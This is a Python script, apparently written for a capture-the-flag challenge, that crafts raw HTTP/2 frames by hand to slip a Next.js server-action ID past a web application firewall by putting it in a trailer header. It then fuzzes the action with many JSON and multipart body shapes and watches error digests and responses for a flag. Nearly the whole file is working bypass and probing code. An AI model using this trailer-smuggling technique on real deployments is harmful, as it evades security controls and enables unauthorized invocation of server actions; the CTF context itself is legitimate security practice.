#!/usr/bin/env python3
"""
probe31: iterate through body shapes for fetch-action call (via HTTP/2 trailer WAF bypass).

Action throws exception with digest=2760153669 on body=[]. Try various args shapes.
React Flight fetch-action body conventions:
- text/plain;charset=UTF-8 + JSON array of args (simple values)
- multipart/form-data with FormData fields
- Content-Type override

We change body + Content-Type and check digest changes (different digest = different
code path = progress). Goal: digest disappears → action succeeds → restored:true.
"""
import socket
import ssl
import struct
import time
import re
import json
import hashlib
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def read_frames(sock, want_stream=1, max_time=12):
    sock.settimeout(max_time)
    buf = b""
    end = False
    out = []
    deadline = time.time() + max_time
    while not end and time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
        while True:
            if len(buf) < 9:
                break
            length = int.from_bytes(buf[:3], "big")
            ftype = buf[3]
            flags = buf[4]
            sid = int.from_bytes(buf[5:9], "big") & 0x7fffffff
            if len(buf) < 9 + length:
                break
            payload = buf[9:9+length]
            buf = buf[9+length:]
            out.append((ftype, flags, sid, payload))
            if sid == want_stream and (ftype in (0, 1) and flags & 0x1):
                end = True
                break
    return out


def parse_response(frames):
    from hpack import Decoder
    dec = Decoder()
    status = None
    body = b""
    headers = []
    for ftype, flags, sid, payload in frames:
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                headers.extend(hdrs)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, headers, body


def call_action(body_bytes, content_type="text/plain;charset=UTF-8", extra=None):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p31"),
    ]
    if extra:
        for k, v in extra:
            headers.append((k, v))
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames = read_frames(sock, want_stream=sid, max_time=12)
    sock.close()
    return parse_response(frames)


def diag(body):
    """Extract digest, restored, action ref."""
    text = body.decode("utf-8", "replace")
    digest = re.search(r'"digest":"([^"]+)"', text)
    restored = '"restored":true' in text
    action_ref = re.search(r'"recoveryAction":"\$F([0-9a-f]+)"', text)
    flag = re.search(r'alfa\{[^}]+\}', text)
    return {
        "digest": digest.group(1) if digest else None,
        "restored": restored,
        "actionref": action_ref.group(1) if action_ref else None,
        "flag": flag.group(0) if flag else None,
        "len": len(body),
    }


def test(label, body, ct="text/plain;charset=UTF-8", extra=None):
    try:
        st, hdr, b = call_action(body if isinstance(body, bytes) else body.encode(), ct, extra)
    except Exception as e:
        print(f"[{label:40s}] EXC: {type(e).__name__}: {e}")
        return None
    d = diag(b)
    sha = hashlib.sha256(b).hexdigest()[:12]
    marker = ""
    if d["restored"]:
        marker = " <RESTORED!>"
    elif d["flag"]:
        marker = f" <FLAG: {d['flag']}>"
    elif d["digest"] != "2760153669" and d["digest"] is not None:
        marker = f" <NEW-DIGEST: {d['digest']}>"
    elif d["digest"] is None and st in ("200", "303"):
        marker = " <NO-ERROR>"
    print(f"[{label:40s}] {st} len={d['len']:5d} sha={sha} digest={d['digest']} restored={d['restored']}{marker}")
    return d


# Cases: body shape × content-type
print("\n## JSON body via text/plain;charset=UTF-8")
test("[]",                       b"[]")
test("[null]",                   b"[null]")
test("[\"\"]",                   b'[""]')
test("[0]",                      b"[0]")
test("[true]",                   b"[true]")
test("[{}]",                     b"[{}]")
test("[[]]",                     b"[[]]")
test("['confirm']",              b'["confirm"]')
test("['restore']",              b'["restore"]')
test("[1, 'confirm']",           b'[1,"confirm"]')
test("[{p, w, t}]",              b'[{"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}]')
test("[{confirm:true}]",         b'[{"confirm":true}]')
test("[{restore:true}]",         b'[{"restore":true}]')
test("[{packet:south...}]",      b'[{"packet":"south-line.2026-03-27"}]')
test("[null, null]",             b"[null,null]")
test("[null, null, null]",       b"[null,null,null]")
test("['x','y','z']",            b'["x","y","z"]')
test("3 string args",            b'["south-line.2026-03-27","WO-17-04","OP-3"]')
test("4 args + confirm",         b'["south-line.2026-03-27","WO-17-04","OP-3","confirm"]')
test("FormData ref",             b'["$K1"]')  # React Flight: K = FormData ref

print("\n## With Next-Action-Origin / x-action-origin")
test("origin=/",                 b"[]", extra=[("next-action-origin", "/")])
test("ref=/",                    b"[]", extra=[("referer", "https://funicular-gm2cxozn.alfactf.ru/")])
test("origin /api/operator",     b"[]", extra=[("origin", "https://funicular-gm2cxozn.alfactf.ru")])

print("\n## Multipart/form-data")
def multipart(fields):
    b = "----p31"
    parts = []
    for n, v in fields:
        parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n{v}\r\n")
    parts.append(f"--{b}--\r\n")
    return ("multipart/form-data; boundary=" + b, "".join(parts).encode())

ct, body = multipart([("0", "south-line.2026-03-27")])
test("MP 0=packet", body, ct=ct)

ct, body = multipart([("0", '{"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}')])
test("MP 0={obj}", body, ct=ct)

ct, body = multipart([("0", "south-line.2026-03-27"), ("1", "WO-17-04"), ("2", "OP-3")])
test("MP 0,1,2=p,w,t", body, ct=ct)

ct, body = multipart([("$ACTION_ID_" + ACTION_ID, "")])
test("MP $ACTION_ID empty", body, ct=ct)

ct, body = multipart([("$ACTION_ID_" + ACTION_ID, ""), ("packet", "south-line.2026-03-27"), ("workOrder", "WO-17-04"), ("terminal", "OP-3")])
test("MP $ACTION_ID + p/w/t", body, ct=ct)

# React Flight FormData ref encoding: "$K1" is a FormData reference, then 1=actual fields
ct, body = multipart([("0", "$K1"), ("1_packet", "south-line.2026-03-27")])
test("MP $K1 ref + 1_packet", body, ct=ct)

print("\n# done.")
